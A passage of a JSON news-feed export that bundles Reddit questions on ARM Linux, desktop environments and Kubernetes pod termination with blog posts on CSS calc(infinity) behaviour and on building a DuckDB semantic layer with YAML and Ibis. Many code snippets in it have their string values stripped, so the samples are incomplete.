perhaps just avoid threading in Macroquad. I don't get it. Footguns, footguns everywhere.</p>","contentLength":2180,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Experience with arm based system","url":"https://www.reddit.com/r/linux/comments/1mw8hui/experience_with_arm_based_system/","date":1755776346,"author":"/u/roaste7_Potato","guid":235703,"unread":true,"content":"<p>Hi has anyone run any distro on arm procesor and if so how was it. I know for a fact you can run most distros on arm but what about other programs. I'm asking because i'm considering of buying arm based laptop and i want to know if i can transfer all my riced system without recompiling everything for arm. Thanks in advance for every answer.</p><p>Edit: If it matters i'm using rn arch with hyperland but i'm also fiddling with void.</p>","contentLength":427,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"To Infinity… But Not Beyond!","url":"https://meyerweb.com/eric/thoughts/2025/08/20/to-infinity-but-not-beyond/","date":1755775803,"author":"/u/JadeLuxe","guid":235667,"unread":true,"content":"<p><a href=\"https://meyerweb.com/eric/thoughts/2025/08/07/infinite-pixels/\">Previously on meyerweb</a>, I explored ways to do strange things with <a href=\"https://www.w3.org/TR/css-values-4/#calc-error-constants\">the  keyword</a> in CSS calculation functions.&nbsp; There were some great comments on that post, by the way; you should definitely go give them a read.&nbsp; Anyway, in this post, I’ll be doing the same thing, but with different properties!</p><p>When last we met, I’d just finished up messing with font sizes and line heights, and that made me think about other text properties that accept lengths, like those that indent text or increase the space between words and letters.&nbsp; You know, like these:</p><pre><code>div:nth-of-type(1) {text-indent: calc(infinity * 1ch);}\ndiv:nth-of-type(2) {word-spacing: calc(infinity * 1ch);}\ndiv:nth-of-type(3) {letter-spacing: calc(infinity * 1ch);}\n</code></pre><pre><code>&lt;div&gt;I have some text and I cannot lie!&lt;/div&gt;\n&lt;div&gt;I have some text and I cannot lie!&lt;/div&gt;\n&lt;div&gt;I have some text and I cannot lie!&lt;/div&gt;</code></pre><p>According to Frederic Goudy, I am now the sort of man who would steal a infinite number of sheep.&nbsp; Which is untrue, because, I mean, where would I put them?</p><p>Visually, these all came to exactly the same result, textually speaking, with just very small (probably line-height-related) variances in element height.&nbsp; All get very large horizontal overflow scrolling, yet scrolling out to the end of that overflow reveals no letterforms at all; I assume they’re sat just offscreen when you reach the end of the scroll region.&nbsp; I particularly like how the “I” in the first  disappears because the first line has been indented a few million (or a few hundred undecillion) pixels, and then the rest of the text is wrapped onto the second line.&nbsp; And in the third , we can check for line-leading <a href=\"http://wikipedia.org/wiki/Steganography\">steganography</a>!</p><p>When you ask for the computed values, though, that’s when things get weird.</p><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr></tbody></table><p>Safari and Firefox are at least internally consistent, if many orders of magnitude apart from each other.&nbsp; Chrome… I don’t even know what to say.&nbsp; Maybe pick a lane?</p><p>I have to admit that by this point in my experimentation, I was getting a little bored of infinite pixel lengths.&nbsp; What about infinite unitless numbers, like  or  — &nbsp;even better  — &nbsp;?</p><pre><code>div {\n\tposition: absolute;\n}\ndiv:nth-of-type(1) {\n\ttop: 10%;\n\tleft: 1em;\n\tz-index: calc(infinity + 1);\n}\ndiv:nth-of-type(2) {\n\ttop: 20%;\n\tleft: 2em;\n\tz-index: calc(infinity);\n}\ndiv:nth-of-type(3) {\n\ttop: 30%;\n\tleft: 3em;\n\tz-index: 32767;\n}</code></pre><pre><code>&lt;div&gt;I’m really high!&lt;/div&gt;\n&lt;div&gt;I’m really high!&lt;/div&gt;\n&lt;div&gt;I’m really high!&lt;/div&gt;</code></pre><p>It turns out that in CSS you can go to infinity, but  beyond, because the computed values were the same regardless of whether the  value was  or .</p><table><tbody><tr></tr></tbody></table><p>Thus, the first two  s were a long way above the third, but were themselves drawn with the later-painted  on top of the first.&nbsp; This is because in positioning, if overlapping elements have the same  value, the one that comes later in the DOM gets painted over top any that come before it.</p><p>This does also mean you can have a finite value beat infinity.&nbsp; If you change the previous CSS like so:</p><pre><code>div:nth-of-type(3) {\n\ttop: 30%;\n\tleft: 3em;\n\tz-index: 2147483647;\n}</code></pre><p>…then the third  is painted atop the other two, because they all have the same computed value.&nbsp; And no, increasing the finite value to a value equal to 2,147,483,648 or higher doesn’t change things, because the computed value of anything in that range is still .</p><p>The results here led me to an assumption that browsers (or at least the coding languages used to write them) use a system where any “infinity” that has multiplication, addition, or subtraction done to it just returns “infinite”.&nbsp; So if you try to double , you get back  (or  or  or whatever symbol is being used to represent the concept of the infinite).&nbsp; Maybe that’s entry-level knowledge for your average computer science major, but I was only one of those briefly and I don’t think it was covered in the assembler course that convinced me to find another major.</p><p>Looking across all those years back to my time in university got me thinking about infinite spans of time, so I decided to see just how long I could get an animation to run.</p><pre><code>div {\n\tanimation-name: shift;\n\tanimation-duration: calc(infinity * 1s);\n}\n@keyframes shift {\n\tfrom {\n\t\ttransform: translateX(0px);\n\t}\n\tto {\n\t\ttransform: translateX(100px);\n\t}\n}</code></pre><p>The results were truly something to behold, at least in the cases where beholding was possible.&nbsp; Here’s what I got for the computed  value in each browser’s web inspector Computed Values tab or subtab:</p><table><caption>animation-duration values</caption><thead><tr></tr></thead><tbody><tr></tr><tr></tr></tbody></table><p>Those are…  long durations.&nbsp; In Firefox, the  will finish the animation in just a tiny bit over ten nonillion (ten quadrillion quadrillion) .&nbsp; That’s roughly ten times as long as it will take for nearly all the matter in the known Universe to have been swallowed by supermassive galactic black holes.</p><p>In Chrome, on the other hand, completing the animation will take  our current highest estimate for the amount of time it will take for all the protons and neutrons in the observable Universe to decay into radiation, assuming protons actually decay. (Source: Wikipedia’s <a href=\"https://en.wikipedia.org/wiki/Timeline_of_the_far_future\">Timeline of the far future</a>.)</p><p>“Okay, but what about Safari?” you may be asking.&nbsp; Well, there’s no way as yet to find out, because while Safari loads and renders the page like usual, the page then becomes essentially unresponsive.&nbsp; Not the browser, just the page itself.&nbsp; This includes not redrawing or moving the scrollbar gutters when the window is resized, or showing useful information in the Web Inspector.&nbsp; I’ve already <a href=\"https://bugs.webkit.org/show_bug.cgi?id=297596\">filed a bug</a>, so hopefully one day we’ll find out whether its temporal limitations are the same as Chrome’s or not.</p><p>It should also be noted that it doesn’t matter whether you supply  or  as the thing to multiply with : you get the same result either way.&nbsp; This makes some sense, because any finite number times infinity is still infinity.&nbsp; Well, sort of.&nbsp; But also yes.</p><p>So what happens if you divide a finite amount by infinity?&nbsp; In browsers, you very consistently get !</p><pre><code>div {\n\tanimation-name: shift;\n\tanimation-duration: calc(100000000000000000000000s / infinity);\n}</code></pre><p>(Any finite number could be used there, so I decided to type 1 and then hold the 0 key for a second or two, and use the resulting large number.)</p><table><caption>Division-by-infinity results</caption><tbody></tbody></table><p>Honestly, seeing that kind of cross-browser harmony… that was soothing.</p><p>And so we come full circle, from something that yielded consistent results to something else that yields consistent results.&nbsp; Sometimes, it’s the little wins that count the most.</p>","contentLength":6487,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw8b5b/to_infinity_but_not_beyond/"},{"title":"Choosing a DE","url":"https://www.reddit.com/r/linux/comments/1mw89kv/choosing_a_de/","date":1755775669,"author":"/u/FewMasterpiece8840","guid":235671,"unread":true,"content":"<p>Hey Linux community, I'm setting up a new machine a Mint machine with Ubuntu Studio packaging I'm having to chose a DE but I'm really not excited about any of the current DEs I'm running Fluxbox in my MX and I really like that but I wanted something a bit more modern. I initially looked into KDE but not too keen on it, I wanted to try Wayland but I'm not too keen on some aspects, I currently intalled MATE but I'm finding it uninspiring, love the nostalgia and what not but I'm not excited.</p><p>What do you guys use? what makes you want to spend time on your machine??</p>","contentLength":566,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why does my node app unable to connect to database while the pod is terminating?","url":"https://www.reddit.com/r/kubernetes/comments/1mw7zsv/why_does_my_node_app_unable_to_connect_to/","date":1755774825,"author":"/u/___NaN___","guid":236785,"unread":true,"content":"<p>I have a node.js app with graceful termination logic to stop executing jobs and close the DB connection on termination. But just before pod termination even starts the db queries fail due to</p><p><code>Error: Connection terminated unexpectedly</code></p><pre><code> \"knex\": \"^3.1.0\", \"pg\": \"^8.15.6\", \"pg-promise\": \"^11.13.0\", </code></pre><p>Why does the app behave that way ?</p><ul><li>I tried looking up knex/pg behaviour on SIGTERM (Has no specific behaviour)</li><li>I checked the kubernetes lifecycle during Termination wrt network</li></ul><p>Neither of them say the existing TCP connections will be closed during Termination, until the POD received SIGKILL</p>","contentLength":581,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Why Semantic Layers Matter — and How to Build One with DuckDB - MotherDuck Blog","url":"https://motherduck.com/blog/semantic-layer-duckdb-tutorial/","date":1755774240,"author":"/u/BrewedDoritos","guid":235669,"unread":true,"content":"<p>Many ask themselves, \"Why would I use a semantic layer? What is it anyway?\" In this hands-on guide, we’ll build the simplest possible semantic layer using just a YAML file and a Python script—not as the goal itself, but as a way to understand the value of semantic layers. We’ll then query 20 million NYC taxi records with consistent business metrics executed using DuckDB and Ibis. By the end, you’ll know exactly when a semantic layer solves real problems and when it’s overkill.</p><p>It's a topic that I'm passionate about as I've been using semantic layers within a Business Intelligence (BI) tool for over twenty years, and only recently have we gotten full-blown semantic layers that can sit outside of a BI tool, combining the advantages of a logical layer with sharing them across your web apps, notebooks, and BI tools. With a semantic layer, your revenue KPI or other complex company measures are defined once in a single source of truth—no need to re-implement them over and over again.</p><p>We'll have a look at the simplest possible semantic layer, which uses a simple YAML file (for the semantics) and a Python script for executing it with Ibis and DuckDB. We'll do a quick recap of the semantic layer before diving into a practical code example.</p><section><h2>When You Don't Need a Semantic Layer</h2><p>Let's start by exploring when you don't need a semantic layer and when it's the wrong choice. The simplest and most straightforward reasons are:</p><ul><li>You're just getting started with analytics and only have one consumer, meaning you only have one way of showcasing analytics data, for example, a BI tool, notebooks, or a web app, but not multiple ways of presenting data. This means you don't apply calculated logic in different places.</li><li>You don't have extensive business logic that you query ad hoc; you have simple counts, SUMs, or averages.</li><li>You preprocess all your metrics as SQL transformations into physical tables, meaning your downstream analytics tools get all metrics preprocessed and aggregated, and filtering is fast enough.</li></ul></section><section><h2>Why Use a Semantic Layer?</h2><p>So when do we actually need one, and what is it? There's a lot of information out there, including from myself about the <a href=\"https://www.ssp.sh/blog/rise-of-semantic-layer-metrics/\">history and rise [2022]</a>, comparing it to an <a href=\"https://cube.dev/blog/exploring-the-semantic-layer-through-the-lens-of-mvc\">MVC-like approach</a>, or explaining its <a href=\"https://cube.dev/blog/universal-semantic-layer-capabilities-integrations-and-enterprise-benefits\">capabilities</a>. That's why in this article I focus on the  and showcase how to use it in a practical example in the next chapter.</p><p>To better understand the reasons for using a semantic layer—without needing to read the full article above—let’s start with a helpful definition from <a href=\"https://communityovercode.org/wp-content/uploads/2023/10/mon_dataeng_building-a-semantic-metrics-layer-using-calcite-julian-hyde.pdf?ref=ssp.sh\">Julian Hyde</a>:</p><blockquote><p>A semantic layer, also known as a metrics layer, lies between business users and the database, and lets those users compose queries in the concepts that they understand. It also governs access to the data, manages data transformations, and can tune the database by defining materializations.\nLike many new ideas, the semantic layer is a distillation and evolution of many old ideas, such as query languages, multidimensional OLAP, and query federation.</p></blockquote><p>The main reasons for using a semantic layer may be one or more of the following needs:</p><ol><li> to define ad hoc queries once, version-controlled and collaboratively, with the possibility of pulling them into different BI tools, web apps, notebooks, or AI/MCP integration. Avoid  of metrics in every tool, making  and data governance much easier; resulting in a <strong>consistent business layer</strong> with encapsulated business logic.</li></ol><p>: Most organizations quickly run multiple BI tools simultaneously with additional Excel or Google Sheets. Instead of maintaining separate calculated fields and business logic in each tool in a proprietary format, semantic layers provide one definition that works across all platforms.</p><ol start=\"2\"><li> is needed for ad hoc queries that are based on various source databases. Defining the metrics that enable pre-calculations for sub-second query responses can benefit any downstream analytics tools compared to implementing custom database connections and different databases. Eliminating potential  by querying data where it lives, using dialect-optimized SQL pushdown across heterogeneous sources. This reduces infrastructure overhead and cloud computing costs.</li></ol><p>: For a non-production or high-load OLTP source, the semantic layer can directly query the various data sources (e.g., IoT data, logs, and other data) instead of moving them into a data lake or data warehouse, and through the cache of the semantic layer, it's fast enough without data movement.</p><ol start=\"3\"><li>Unified  through  (REST, GraphQL, SQL, ODBC/JDBC, MDX/Excel) as well. Unified Analytics API enables self-serve BI by allowing users to connect Excel to a cleaned, fast, and unified API.</li></ol><p>: Centralized row-level and column-level security that works consistently across all downstream analytics tools, rather than trying to manage access controls separately in each BI tool or analytics tool that has access to the data. Users can connect directly with Excel and have the correct permissions and calculated business metrics out of the box.</p><ol start=\"4\"><li> automatically translates simple, business-friendly queries into complex, optimized SQL across multiple databases. This enables users to write intuitive queries using business concepts (like \"average_order_value\") without needing to know the underlying data model complexity, table relationships, or database-specific syntax. The semantic layer  complex analytics, such as ratios at different grains, time ranges (YoY, trailing periods), and custom calendars, into simple semantic queries.</li></ol><p>: Complex analytics simplified by handling sophisticated calculations that are painful in raw SQL: ratios at different grains (like per-member-per-month in insurance), time intelligence (year-over-date, trailing 12 months, period-over-period), and custom calendar logic. These become simple semantic queries rather than complex subqueries with distinct counts.</p><ol start=\"5\"><li>Context for LLMs to improve accuracy and natural language querying can be significantly enhanced with a semantic layer, which provides business context and prevents AI from hallucinating frequently, as most of the business logic is configured and defined in a semantic layer, sometimes even data models, to help LLMs further understand the business.</li></ol><p>: Internal Large Language Models (LLMs) or Retrieval-Augmented Generation (RAG) systems need business context to understand the business. A semantic layer's connection of dimensions and facts, along with metric definitions, can help the model understand and suggest better SQL queries or responses through natural language.</p><p>More broadly, semantic layers bridge the gap between business needs and data source integration in a very organized and governed way. They are best optimized for larger enterprises with numerous scattered KPIs that can afford to add another layer to their data stack. However, the example below uses the simplest and smallest semantic layer, even with little data.</p><section><h3>Datasets vs. Aggregations</h3><p>An important distinction is whether we need  datasets or we want  queries. These are typically very different. Ad hoc queries must be flexible and change granularity based on added dimensions. This means someone running a query might switch from a daily view to a weekly or monthly one, add a region, and then decide to roll it up to a country level; all of this can happen in a couple of seconds. Therefore, there is no time to refresh or process the data.</p><p>Calculated measures need to be added on the fly, without requiring an ETL job to be reprocessed. A common workaround is to create multiple persistent physical datasets with dbt, each containing the same data but with varying granularity, allowing for the display of different charts in the BI tool with different focuses. A semantic layer, or ad hoc queries, does that on the fly.</p><p>We can differentiate and say:</p><ul><li>physical table ≠ logical definition</li></ul><p>If you find yourself needing the concepts on the right side, that's when you need a semantic layer—whether built into a BI tool or implemented separately for the reasons mentioned above.</p></section></section><section><h2>How a Semantic Layer Works: A Practical Example</h2><p>Now let's see this in action by analyzing the most pragmatic semantic layer there is. The simplest semantic layer I found is by Julien Hurault, who recently announced the release of the <a href=\"https://github.com/boringdata/boring-semantic-layer\">Boring Semantic Layer (BSL)</a> project. We use DuckDB as the query engine and Python with <a href=\"https://github.com/ibis-project/ibis\">Ibis</a> for the execution layer.</p><p>We're going to build something like what's illustrated below—where we have YAML definitions as our metrics, such as calculated measures and dimensions, and Ibis for the query translation to run <a href=\"https://github.com/ibis-project/ibis#how-it-works\">any execution engine</a>; here we use DuckDB.</p><img alt=\"img1\" loading=\"lazy\" decoding=\"async\" data-nimg=\"fill\" sizes=\"90vw,\n                        (min-width: 728px) 800px,\n                        (min-width: 960px) 950px,\" srcset=\"/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=640&amp;q=75 640w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=750&amp;q=75 750w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=828&amp;q=75 828w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1080&amp;q=75 1080w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1200&amp;q=75 1200w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=1920&amp;q=75 1920w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=2048&amp;q=75 2048w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=3840&amp;q=75 3840w\" src=\"https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg1_sem_da2c2e7350.png&amp;w=3840&amp;q=75\"><section><p>Let's create a virtual environment where we install our dependencies and install the semantic layer:</p><pre><code>git  git@github.com:sspaeti/semantic-layer-duckdb.git\nuv </code></pre><p>That will not only install the semantic layer, but also Ibis and other requirements.</p><p>Now we are ready to define our metrics. To simplify this example and focus on the metrics rather than the data, I utilized the <a href=\"https://www.nyc.gov/site/tlc/about/tlc-trip-record-data.page\">NYC Taxi Dataset</a>, which we all know and are familiar with. They have a lookup table for pickups and lots of data we can use, and it is available via HTTPS.</p><p>As we know now, semantic layers are suitable for defining metrics in a central and configurable way, so we use YAML for this. YAML has minimal overhead and is easy to read, which is why most semantic layers use it. Alternatively, SQL would be a better choice, but it lacks essential features like variables and tends to become overly nested and challenging to maintain. YAML, combined with occasional SQL injection, proves to be the most effective solution.</p><p>First, let's check out what data we are working with—we can quickly count and describe the tables:</p><pre><code>D  count(*) FROM read_parquet();\n┌─────────────────┐\n│  count_star()   │\n│      int64      │\n├─────────────────┤\n│    19868009     │\n│ (19.87 million) │\n└─────────────────┘\nD DESCRIBE FROM read_parquet();\n┌──────────────────────┬─────────────┬─────────┬─────────┬─────────┬─────────┐\n│     column_name      │ column_type │  null   │   key   │ default │  extra  │\n│       varchar        │   varchar   │ varchar │ varchar │ varchar │ varchar │\n├──────────────────────┼─────────────┼─────────┼─────────┼─────────┼─────────┤\n│ hvfhs_license_num    │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ dispatching_base_num │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ originating_base_num │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ request_datetime     │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │\n│ on_scene_datetime    │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │\n│ pickup_datetime      │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │\n│ dropoff_datetime     │ TIMESTAMP   │ YES     │ NULL    │ NULL    │ NULL    │\n│ PULocationID         │ INTEGER     │ YES     │ NULL    │ NULL    │ NULL    │\n│ DOLocationID         │ INTEGER     │ YES     │ NULL    │ NULL    │ NULL    │\n│ trip_miles           │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ trip_time            │ BIGINT      │ YES     │ NULL    │ NULL    │ NULL    │\n│ base_passenger_fare  │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ tolls                │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ bcf                  │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ sales_tax            │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ congestion_surcharge │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ airport_fee          │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ tips                 │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ driver_pay           │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n│ shared_request_flag  │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ shared_match_flag    │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ access_a_ride_flag   │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ wav_request_flag     │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ wav_match_flag       │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ cbd_congestion_fee   │ DOUBLE      │ YES     │ NULL    │ NULL    │ NULL    │\n├──────────────────────┴─────────────┴─────────┴─────────┴─────────┴─────────┤\n│ 25 rows                                                          6 columns │\n└────────────────────────────────────────────────────────────────────────────┘\n</code></pre><p>As well as the CSV lookups:</p><pre><code>D  count(*) from read_csv();\n┌──────────────┐\n│ count_star() │\n│    int64     │\n├──────────────┤\n│     265      │\n└──────────────┘\nD describe from read_csv();\n┌──────────────┬─────────────┬─────────┬─────────┬─────────┬─────────┐\n│ column_name  │ column_type │  null   │   key   │ default │  extra  │\n│   varchar    │   varchar   │ varchar │ varchar │ varchar │ varchar │\n├──────────────┼─────────────┼─────────┼─────────┼─────────┼─────────┤\n│ LocationID   │ BIGINT      │ YES     │ NULL    │ NULL    │ NULL    │\n│ Borough      │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ Zone         │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n│ service_zone │ VARCHAR     │ YES     │ NULL    │ NULL    │ NULL    │\n└──────────────┴─────────────┴─────────┴─────────┴─────────┴─────────┘\n</code></pre><p>This gives us a good sense of what we are dealing with. From the <a href=\"https://www.nyc.gov/assets/tlc/downloads/pdf/data_dictionary_trip_records_hvfhs.pdf\">data dictionary</a>, we understand that  and  represent the Taxi zones to be joined with the above zone lookup by the column .</p><p>Usually what I do next is use the <a href=\"https://duckdb.org/docs/stable/guides/meta/summarize.html\"> command</a>, which is a DuckDB-specific query type that gives us statistics about the data such as ,&nbsp;,&nbsp;,&nbsp;,&nbsp;,&nbsp;,&nbsp;,&nbsp;,&nbsp;. This gives us a fast and handy overview of what we are dealing with.</p><section><h4>Defining Metrics in Boring Semantic Layer</h4><p>Next, we can start defining our metrics. Let's start by setting the timestamp and its granularity (required by BSL), followed by the dimensions, which looks something like this:</p><pre><code></code></pre><p>The  is the time column, with the grain set to seconds, and all other columns are treated as dimensions.</p><p>The interesting part is when we set the measures, which are the calculations, that can become very complex and potentially depend on many layers of existing measures. This is how we define our measures:</p><pre><code></code></pre><p>And some more that only aggregate flagged data, such as shared trip or wheelchair requested:</p><pre><code></code></pre><p>To create a functional dashboard and drill down into different angles, we need  that provide more context when querying data. For example, if we want to aggregate on  in New York City, this information is not in the trips data, but in our lookup table, as we saw in the above . Let's now join this table and use this information.</p><p>First, we define the additional dataset in the YAML as follows:</p><pre><code></code></pre><p>Lastly, we need to join the two datasets. This can be specified like this - added to the  dataset:</p><pre><code></code></pre></section></section><section><h3>Query Data through Python/Ibis and DuckDB</h3><p>Next, we need to set up our execution logic—which is Python code in this case—and use the translation layer Ibis to run DuckDB queries as our SQL engine locally.</p><p>I'll explain the most important steps here, but I'll skip some details—the full script you can find in <a href=\"https://github.com/sspaeti/semantic-layer-duckdb/blob/main/nyc_taxi.py\">nyc_taxi.py</a>. First, we import Ibis and our  class from Boring Semantic Layer and we define the datasets and execution engine via Ibis—again, here we use DuckDB and read the dataset directly from <a href=\"https://aws.amazon.com/cloudfront/\">CloudFront</a>:</p><pre><code> ibis\n boring_semantic_layer  SemanticModel\n\ncon = ibis.duckdb.connect() \ntables = {\n    : con.read_csv(),\n    : con.read_parquet(),\n}\n</code></pre><p>Now that we have read the metrics definition we created in the YAML  file above and mapped it to the tables dataset, the boring semantic layer knows which dataset we have and can query it:</p><pre><code>models = SemanticModel.from_yaml(, tables=tables)\n\ntaxi_zones_sm = models[] \ntrips_sm = models[] \n</code></pre><p>And then we define our query as a Python expression with Ibis and BSL—here the <strong>trip volume by pickup borough</strong>:</p><pre><code>expr = trips_sm.query(\n  dimensions=[],\n  measures=[, , ],\n  order_by=[(, )],\n  limit=,\n)\n</code></pre><p>And we can execute and print it with:</p><pre></pre><p>The result looks something like this:</p><pre><code>  pickup_zone_borough  trip_count  avg_trip_miles  avg_base_fare\n0           Manhattan     7122571        5.296985      33.575738\n1            Brooklyn     5433158        4.215820      23.280429\n2              Queens     4453220        6.379047      29.778835\n3               Bronx     2541614        4.400500      20.313596\n4       Staten Island      316533        5.262288      22.200712\n</code></pre><p>So what just happened? We defined the dimension () in which we want to display the measure, configured the three measures to be shown, and specified the order and the number of rows to return with LIMIT.</p><p>The magic is that we can now change the metric in the YAML file, add a CASE WHEN statement, or fix a formatting error all without touching the query or code. Less technical people gain access through a <a href=\"https://en.wikipedia.org/wiki/Domain-specific_language\">DSL (Domain Specific Language)</a> and a separate configuration file, which we can version control, collaborate on, or even utilize LLMs to create new measures and dimensions.</p><p>Ibis gives us the flexibility to do it in a Pythonic way.</p><p>Find more examples such as the popular pickup zones, service zone analysis, revenue analysis by trip distance, and accessibility metrics in the whole script  and yaml in .</p></section><section><p>If you wish to speed things up and create a , the option is there with the help of <a href=\"https://github.com/xorq-labs/xorq\">Xorq</a>—example from <a href=\"https://github.com/boringdata/boring-semantic-layer/blob/main/examples/example_materialize.py\">example_materialize.py</a>.</p><pre><code>\n    {\n        , , ,\n         [, , , , ],\n         [, , , , ],\n    }\n</code></pre></section><section><p>This example is relatively simple, but showcases how you can use a simple semantic layer on top of your data lake with DuckDB.</p><p>If you need more advanced measures that are , you can imagine how beneficial it would be. The beauty of semantic layers lies in their ability to simply define dependencies on complex measures, eliminating the need to repeat 100 lines of SQL code in your CTE query.</p><p>Obviously, you could use dbt to manage dependencies, but you wouldn't have the ad hoc query capability, the on-the-fly filtering, or nicely defined YAML files that represent your dynamic queries.</p></section><section><p>Interestingly, the BSL also includes some visualization capabilities with a built-in wrapper around&nbsp;&nbsp;(JSON-based grammar for creating interactive visualizations that provides a declarative approach to chart creation) and its Python wrapper&nbsp;.</p><p>Just install with <code>uv add 'boring-semantic-layer[visualization]' altair[all]</code> and you can create a simple visualization. This is a bit extended to create a nice-looking image, but you can imagine this being much shorter with only the title, for example:</p><pre><code>\npng_bytes = expr.chart(\n  =,  \n  spec={\n\t: {\n\t    : ,\n\t    : ,\n\t    : ,\n\t    : \n\t},\n\t: {\n\t    : ,\n\t    : ,\n\t    : \n\t},\n\t: {\n\t    : {\n\t\t  : ,\n\t\t  : ,\n\t\t  : ,\n\t\t  : ,\n\t\t  : {\n\t\t\t: -,\n\t\t\t: ,\n\t\t\t: \n\t\t  }\n\t    },\n\t    : {\n\t\t  : ,\n\t\t  : ,\n\t\t  : ,\n\t\t  : {\n\t\t\t: ,\n\t\t\t: ,\n\t\t\t: \n\t\t  }\n\t    }\n\t},\n\t: ,\n\t: ,\n\t: \n  }\n)\n\n(, )  f:\n  f.write(png_bytes)\n\n</code></pre><p>The generated PNG looks like this:\n<img alt=\"image\" loading=\"lazy\" decoding=\"async\" data-nimg=\"fill\" sizes=\"90vw,\n                        (min-width: 728px) 800px,\n                        (min-width: 960px) 950px,\" srcset=\"/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=640&amp;q=75 640w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=750&amp;q=75 750w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=828&amp;q=75 828w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1080&amp;q=75 1080w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1200&amp;q=75 1200w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=1920&amp;q=75 1920w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=2048&amp;q=75 2048w, /_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=3840&amp;q=75 3840w\" src=\"https://motherduck.com/_next/image/?url=https%3A%2F%2Fmotherduck-com-web-prod.s3.amazonaws.com%2Fassets%2Fimg%2Fimg2_sem_71b5372e80.png&amp;w=3840&amp;q=75\"></p></section></section><section><p>This showed you how to implement a semantic layer with DuckDB and simple tools pragmatically. Moreover, I hope it has provided you with a better understanding of the semantic layer and its appropriate usage.</p><p>Before we wrap up, let's go through the most common questions when it comes to a semantic layer.</p><blockquote><p><strong>But why can't we just use a database?</strong></p></blockquote><p>The key is the semantic logic layer, abstracting the physical world from the modeling world. This gives you better flexibility to implement what the business wants, rather than what the physical data model can do.</p><p>Try implementing a 'revenue per customer by quarter with year-over-year comparison' across five different BI tools using just database views—you'll most probably end up with five different implementations that drift apart over time.</p><blockquote><p><strong>What if we have 100s of metrics, do we need a semantic layer?</strong></p></blockquote><p>That's precisely when you  a semantic layer most. Managing 100+ metrics across multiple tools without a single unified view becomes a governance nightmare. Each tool ends up with slightly different calculations, and nobody knows which version is the correct one. A semantic layer gives you one source of truth.</p><blockquote><p><strong>Isn't a semantic layer adding too much complexity to the already complex data 